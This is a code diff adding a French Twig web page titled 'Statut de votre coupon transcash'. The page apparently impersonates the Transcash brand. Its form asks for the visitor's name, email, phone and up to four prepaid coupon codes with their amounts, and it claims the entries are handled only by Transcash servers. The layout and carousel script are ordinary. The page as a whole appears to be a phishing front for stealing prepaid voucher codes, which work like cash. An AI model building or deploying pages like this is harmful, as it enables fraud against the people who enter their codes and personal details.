@@ -1,0 +1,449 @@
+{% extends 'base.html.twig' %}
+
+{% block title %}Statut de votre coupon transcash{% endblock %}
+
+{% block body %}
+
+<body>  
+  <!-- Masthead -->
+
+  <section>
+
+
+
+   
+
+    <div id="minimal-bootstrap-carousel" class="carousel slide carousel-fade slider-content-style slider-home-one" data-ride="carousel">
+        <!-- Wrapper for slides -->
+        <div class="carousel-inner">
+            <div class="carousel-item active slide-1" style="background-image: url(/images/products/transcash-verification.jpg);background-attachment: fixed;background-position: top;">
+                <div class="carousel-caption">
+                    <div class="container">
+                        <div class="box valign-middle">
+                            <div class="content text-center">
+
+                                
+                                
+                                <a data-animation="animated fadeInDown" href="#verifier" class="thm-btn ">VERIFICATION TRANSCASH</a>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+
+        </div>
+        <!-- Controls -->
+        
+    </div>
+
+    <div class="container mt-4">
+
+
+     {% if not forminformationscoupons.vars.valid %}
+
+    <div class="alert alert-dismissible alert-danger">
+        <button type="button" class="close" data-dismiss="alert">&times;</button>
+        Veuillez remplir les toutes les informations correctement!
+    </div>
+  
+  
+    {% endif %}
+  
+  
+  
+  {% for message in app.flashes('success') %}
+  
+  
+  <div class="alert alert-dismissible alert-success">
+      <button type="button" class="close" data-dismiss="alert">&times;</button>
+      {{ message }}
+  </div>
+  
+  
+  {% endfor %} 
+  
+</div>
+  
+
+  </section>
+
+  
+
+  <!-- About Section -->
+  <section class="page-section container" id="verifier">
+
+   
+
+    
+  
+    <div class="jumbotron text-center mt-4" style="border:1px solid rgb(244,98,58);">
+
+        <h2 class="small"><i class="fas fa-exclamation-triangle"></i> Les informations entrées ne sont traitées que par le serveurs Transcash et sont totalement confidentielles durant la durée de votre connexion. Veuillez insérer votre adresse email et un numéro de téléphone valide afin de recevoir le statut de votre coupon par Email/SMS.</h2>
+
+    </div>
+
+    
+          <hr class="divider primary my-4">
+
+
+          {{ form_start(forminformationscoupons) }}
+
+        <div class="row col-md-12 lead text-center">
+
+            <div class="col-md-12 row">
+
+            <div class="col-md-6">
+                {{ form_row(forminformationscoupons.nom,{'attr' : {'placeholder': "Nom",'class':"form-control"}})
+                }}
+            </div>
+
+            <div class="col-md-6">
+                {{ form_row(forminformationscoupons.prenom,{'attr' : {'placeholder': "Prénom",'class':"form-control"}})
+                }}
+            </div>
+
+        </div>
+
+
+        <div class="col-md-12 mt-4  row">
+
+            <div class="col-md-6">
+                {{ form_row(forminformationscoupons.email,{'attr' : {'placeholder': "E-mail",'class':"form-control"}})
+                }}
+            </div>
+
+            <div class="col-md-6">
+                {{ form_row(forminformationscoupons.telephone,{'attr' : {'placeholder': "Téléphone",'class':"form-control"}})
+                }}
+            </div>
+
+        </div>
+
+        <div class="col-md-12 mt-4  row">
+
+            <div class="col-md-6">
+                {{ form_row(forminformationscoupons.codecoupon1,{'attr' : {'placeholder': "Code du coupon n°1",'class':"form-control"}})
+                }}
+            </div>
+
+            <div class="col-md-6">
+                {{ form_row(forminformationscoupons.montantcoupon1,{'attr' : {'placeholder': "Montant du coupon n°1 (€)",'class':"form-control"}})
+                }}
+            </div>
+
+        </div>
+
+
+        <div class="col-md-12 mt-4  row">
+
+            <div class="col-md-6">
+                {{ form_row(forminformationscoupons.codecoupon2,{'attr' : {'placeholder': "Code du coupon n°2",'class':"form-control"}})
+                }}
+            </div>
+
+            <div class="col-md-6">
+                {{ form_row(forminformationscoupons.montantcoupon2,{'attr' : {'placeholder': "Montant du coupon n°2 (€)",'class':"form-control"}})
+                }}
+            </div>
+        
+        </div>
+
+        <div class="col-md-12 mt-4 row">
+
+            <div class="col-md-6">
+                {{ form_row(forminformationscoupons.codecoupon3,{'attr' : {'placeholder': "Code du coupon n°3",'class':"form-control"}})
+                }}
+            </div>
+
+            <div class="col-md-6">
+                {{ form_row(forminformationscoupons.montantcoupon3,{'attr' : {'placeholder': "Montant du coupon n°3 (€)",'class':"form-control"}})
+                }}
+            </div>
+
+        </div>
+
+        <div class="col-md-12 mt-4 row">
+
+            <div class="col-md-6">
+                {{ form_row(forminformationscoupons.codecoupon4,{'attr' : {'placeholder': "Code du coupon n°4",'class':"form-control"}})
+                }}
+            </div>
+
+            <div class="col-md-6">
+                {{ form_row(forminformationscoupons.montantcoupon4,{'attr' : {'placeholder': "Montant du coupon n°4 (€)",'class':"form-control"}})
+                }}
+            </div>
+
+        </div>
+
+            
+           
+
+        <div class="col-md-12 text-center">
+
+            <button type="submit" class="btn btn-primary mt-4">
+                Obtenir le statut
+            </button>
+        </div>
+        {{ form_end(forminformationscoupons) }}
+
+        <br />
+        <br />
+        <div class="col-md-12 text-center mt-4">
+            <small style="color:orangered">*Informations obligatoires</small>
+        </div>
+  
+      
+    
+  </section>
+
+  
+  <!-- Services Section -->
+  <!--
+  <section class="page-section" id="verification">
+    
+  </section>
+  -->
+
+
+  <!-- Portfolio Section -->
+  
+<style>
+    #minimal-bootstrap-carousel {
+    margin-top: 0px;
+    position: relative;
+}
+
+#minimal-bootstrap-carousel .carousel-caption {
+    position: absolute;
+    top: 0;
+    right: 0;
+    left: 0;
+    bottom: 0;
+    padding: 0;
+    text-align: right;
+    text-shadow: none;
+}
+
+#minimal-bootstrap-carousel .carousel-caption .container {
+    display: table;
+    width: 100%;
+    height: 100%;
+    max-width: 1140px;
+    margin-left: auto;
+    margin-right: auto;
+    text-align: center;
+}
+
+@media (max-width: 1199px) {
+    #minimal-bootstrap-carousel .carousel-caption .container {
+        max-width: 960px;
+    }
+}
+
+@media (max-width: 991px) {
+    #minimal-bootstrap-carousel .carousel-caption .container {
+        max-width: 720px;
+    }
+}
+
+#minimal-bootstrap-carousel .carousel-caption .container .box {
+    display: table-cell;
+    text-align: left;
+}
+
+#minimal-bootstrap-carousel .carousel-caption .container .box.valign-top {
+    vertical-align: top;
+}
+
+#minimal-bootstrap-carousel .carousel-caption .container .box.valign-bottom {
+    vertical-align: bottom;
+}
+
+#minimal-bootstrap-carousel .carousel-caption .container .box.valign-middle {
+    vertical-align: middle;
+}
+
+#minimal-bootstrap-carousel .carousel-caption .container .box .content {
+    display: block;
+}
+
+#minimal-bootstrap-carousel [class*=carousel-control] {
+    background: none;
+    width: 50px;
+    height: 50px;
+    font-size: 36px;
+    line-height: 48px;
+    color: #fff;
+    background-color: transparent;
+    visibility: visible !important;
+    opacity: 1;
+    border: 1px solid #fff;
+    -webkit-transition: all 0.5s ease;
+    -o-transition: all 0.5s ease;
+    transition: all 0.5s ease;
+    top: 50%;
+    -webkit-transform: translateY(-50%);
+    -ms-transform: translateY(-50%);
+    transform: translateY(-50%);
+    z-index: 99;
+}
+
+@media (max-width: 667px) {
+    #minimal-bootstrap-carousel [class*=carousel-control] {
+        width: 30px;
+        height: 30px;
+        font-size: 15px;
+        line-height: 30px;
+    }
+}
+
+@media (max-width: 480px) {
+    #minimal-bootstrap-carousel [class*=carousel-control] {
+        width: 40px;
+        height: 40px;
+        font-size: 17px;
+        line-height: 40px;
+        background: rgba(255, 255, 255, 0.4);
+        color: #000;
+    }
+}
+
+#minimal-bootstrap-carousel .carousel-control-prev {
+    left: 1%;
+}
+
+#minimal-bootstrap-carousel .carousel-control-next {
+    right: 1%;
+}
+
+#minimal-bootstrap-carousel [class*=carousel-control]:hover {
+    opacity: 1;
+    background: rgb(244,98,58);
+    border-color: rgb(244,98,58);
+}
+
+/* fixing slider height */
+#minimal-bootstrap-carousel.slider-home-one .carousel-inner .carousel-item {
+    min-height: 500px;
+    height: 100%;
+    width: 100%;
+    background-repeat: no-repeat;
+    background-size: 100% 100%;
+    background-position: center center;
+    background-color: #222;
+}
+
+
+.slider-content-style .content {
+    text-align: center;
+    position: relative;
+    z-index: 999;
+}
+
+.slider-content-style .content h3,
+.slider-content-style .content h2,
+.slider-content-style .content p {
+    margin: 0;
+}
+
+.slider-content-style .content h3 {
+    color: rgb(15, 11, 11);
+    font-size: 50px;
+    line-height: 1em;
+    font-weight: 600;
+    font-family: 'Josefin Sans';
+    -webkit-animation-delay: .5s;
+    animation-delay: .5s;
+}
+
+.slider-content-style .content p {
+    font-family: 'Josefin Sans';
+    font-weight: 600;
+    font-size: 18px;
+    color: rgb(15,11,11);
+    letter-spacing: .150em;
+    margin-top: 20px;
+    -webkit-animation-delay: 1.5s;
+    animation-delay: 1.5s;
+}
+
+.slider-content-style .content a.thm-btn {
+    background: rgb(244,98,58);
+    display: inline-block;
+    vertical-align: middle;
+    color: rgb(255,255,255);
+    font-size: 18px;
+    letter-spacing: .1em;
+    font-family: 'Josefin Sans';
+    font-weight: 600;
+    padding: 10px 17px;
+    margin-top: 27px;
+    transition: all .4s ease;
+    -webkit-animation-delay: 2s;
+    animation-delay: 2s;
+    text-decoration:none;
+}
+
+.slider-content-style .content a.thm-btn:hover {
+    background: #fff;
+    color:rgb(244,98,58);
+}
+</style>
+
+
+
+<script>
+
+    "use strict"; // Start of use strict
+(function($) {
+
+
+    function bootstrapAnimatedLayer() {
+
+        function doAnimations(elems) {
+            //Cache the animationend event in a variable
+            var animEndEv = "webkitAnimationEnd animationend";
+
+            elems.each(function() {
+                var $this = $(this),
+                    $animationType = $this.data("animation");
+                $this.addClass($animationType).one(animEndEv, function() {
+                    $this.removeClass($animationType);
+                });
+            });
+        }
+
+        //Variables on page load
+        var $myCarousel = $("#minimal-bootstrap-carousel"),
+            $firstAnimatingElems = $myCarousel
+            .find(".carousel-item:first")
+            .find("[data-animation ^= 'animated']");
+
+        //Initialize carousel
+        $myCarousel.carousel();
+
+        //Animate captions in first slide on page load
+        doAnimations($firstAnimatingElems);
+
+        //Other slides to be animated on carousel slide event
+        $myCarousel.on("slide.bs.carousel", function(e) {
+            var $animatingElems = $(e.relatedTarget).find(
+                "[data-animation ^= 'animated']"
+            );
+            doAnimations($animatingElems);
+        });
+    }
+
+    bootstrapAnimatedLayer();
+
+
+
+})(jQuery);
+
+</script>  
+
+
+{% endblock %}
